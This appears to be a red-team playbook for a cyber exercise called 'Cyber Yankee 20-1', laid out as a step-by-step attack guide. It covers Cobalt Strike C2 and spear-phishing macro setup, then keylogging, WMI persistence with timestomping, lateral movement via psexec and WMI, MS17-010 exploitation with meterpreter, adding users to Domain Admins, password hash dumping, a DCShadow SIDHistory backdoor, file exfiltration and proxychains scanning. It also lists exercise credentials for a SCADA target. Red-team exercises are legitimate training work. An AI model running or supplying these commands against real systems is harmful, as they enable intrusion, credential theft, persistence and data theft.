# PLAYBOOK CYBER YANKEE 20-1

## 1. SETUP COBALTSTRIKE

### Start TeamSever
````
./teamserver <IP> <password> <C2 PROFILE> 
````

### Start CobaltStrike
````
## In another terminal run the following. ##

./cobaltstrike

1. Enter name or call sign
2. Click <Yes>

## Please Read Cobaltstrike Playbook ofr a more comprehensive command list ##
````

### Create HTTP/HTTPS Listener
````
1. Select listener
2. Click Add
3. Name Listener (appropriate naming scheme)
4. Select Payload C2 Protocol i.e HTTP/S
5. Enter Host staging Domain Name or IP address
6. Enter Port number
7. Click Save
8. Enter additional Domain Name or IP address (seperated by comma)
````
### Create SMB Listener
````
1. Select listener
2. Click Add
3. Name Listener (appropriate naming scheme)
4. Select Payload C2 Protocol i.e Bind_SMB
5. Enter Host staging Domain Name or IP address
6. Enter Port number
7. Click Save
````

## 2. Spear Phishing
````
- Add steps here
````


## Create SpearPhishing Macro
````
1. Click Attacks
2. Click Packages
3. Click MS Office Macro
4. Select Listener
5. Click Generate
6. Follow additional Instructions
7. Open excel file (on a windows machine)
8. Save excel file
````

<div style="page-break-after: always;"></div>

## ADD SUB-INTERFACE (REDIRECTOR)
### IP ADDR COMMAND
````
## Insert Interface setup script ##

ip addr <ip> <netmask> dev <interface>
````
# ONCE YOU GAIN INITIAL ACCESS
## SITUATION AWARENESS COMMANDS
### *APT 202 - LOW TIER*
````
## Default sleep time 5 mins ##
sleep  300 30

## Interactive mode when actions on objective ##
sleep 10 50
````

| *Commands*       |  *Win Event ID*     |  *Sysmon ID*  | API Command |      
|----------------|:-----------------:|----------------:|-------------:|
| tasklist /v             |  4626          |      1  | No 
| shell net user | none | 1 | No
| shell net share |  none | 1 | No
| shell net view | none | 1 | No
| shell net group "domain admins" /domain | none | 1 | No

### *APT 404 - HIGH TIER*
````
## Default sleep time 10 mins ##
sleep  600 30

## Interactive mode when actions on objective ##
sleep 30 50
````

| *Commands*       |   Event ID*     |  *Sysmon ID*  | *API Command* |      
|----------------|-----------------|----------------:|-------------:|
| ps             |  none          |      1  | Yes 
| net user | none | 1 | Yes
| net share |  none | 1 | Yes
| net view | none | 1 | Yes
| net group "domain admins" /domain | none | 1 | Yes


## Keylogging - using CobaltStrike
````
## Explore.exe is a Good Process to Keylog ##
keylogging x64 <PID>
````
## PERSISTENCE WMI EVENT REGISTRATION
````
powershell-import <Path to PowerLurk.ps1>
powershell Get-WMIEvent

upload <Path to malicous payload>
timestomp <payload> kernel32.dll

power
````

## LATERAL MOVEMENT - using CobaltStrike
````
psexec_psh <IP> <SMB Listener>
psexec <ADMIN SHARE> <IP> <SMB Listener>
wmi <IP> <SMB Listener>
wmic <IP> <SMB Listener>

## Old School Method
upload <executable/dll>
shell copy <executable/dll> <Remote Location>
wmic /node .....
````

# SETUP METASPLOIT
````
msf console
````

## SETUP MSF SOCK PROXY
````
setg Proxies socks4:127.0.0.1:<RHP>
````

## AUXILIARY/SCANNER/SMB/SMB_M17_010
````
use exploit/windows/smb/ms17_010_psexec
options
set RHOST <IP>
set target 1
set payload windows/x64/meterpreter/bind_tcp
set LPORT <PORT NUMBER>
exploit
````

## AUXILIARY/ADMIN/SMB/MS17_010_COMMAND
````
set command net group \"Domain Admins\" <USERNAME> /add /domain
set rhosts <IP's>
````


## EXPLOIT MS17-010
````
use exploit/windows/smb/ms17_010/
set payload meterpreter/bind_tcp
set rhost <IP>
set lport <port number>
````

## METERPRETER COMMANDS

````
ps
ipconfig 
whoami
hashdump || run hashdump
````

## ACTIVE DIRECTORY DC SHADOW BACKDOOR  
### FROM A WORKSTATION
### *System Access*
````
1. Attacler obtains Domain Admins rights
2. Mimikatz register as Domain Controller in AD
3. Make replication change
4. Trigger Replication
````

````
powershell-import <Path to DCShadowPermissions.ps1>

powershell Set-DCShadowPermissions -FakeDC <computer name> -ADPATH "LDAP://CN=AdminSDHolder,CN=System,DC=<DOMAIN>,DC=<DOMAIN>,DC=<DOMAIN>" -Username <username> -Verbose

mimkatz lsadump::dcshadow /object:<username> /attribute:SIDHistory /value:<DOMAIN ADMIN SID WITH RID OF - 512>

Example: S-1-5-21-2102128754-2500892452-41739376602-512
````

### FROM A WORKSTATION
### *User/Admin Access*
````
shell whoami /user
mimikatz lsadump::dcshadow /push
shell dir \\<Domain Controller IP>\C$
````


## COMPRESS FILE
````
makecab <file name>
````

## DIRECTORY SEARCH
````
tree <PATH> /A /F
````

## DATA EXFIL
````
download <file path>
````

## SCADA CREDS & TARGET

| UserName       |  Password     |  Computer |
|----------------|:-----------------:|:-----------|
| users | BlueTeam1          | 123.123.123.123 |



## Clear Memory of Kerberos Tickets
````
klist \purge
````


## Proxychains
### Use only TCP Protocol

````
## Port 9050 is the default port for ProxyChains ##

nano /etc/proxychains.conf
proxychains nmap -Pn -n -sT <IP Range>
````

## SSH Tunnel Scanning
````
## Port 9050 is the default port for ProxyChains ##

ssh -D 9050 user@<IP>
proxychains nmap -Pn -n -sT <IP Range>
````


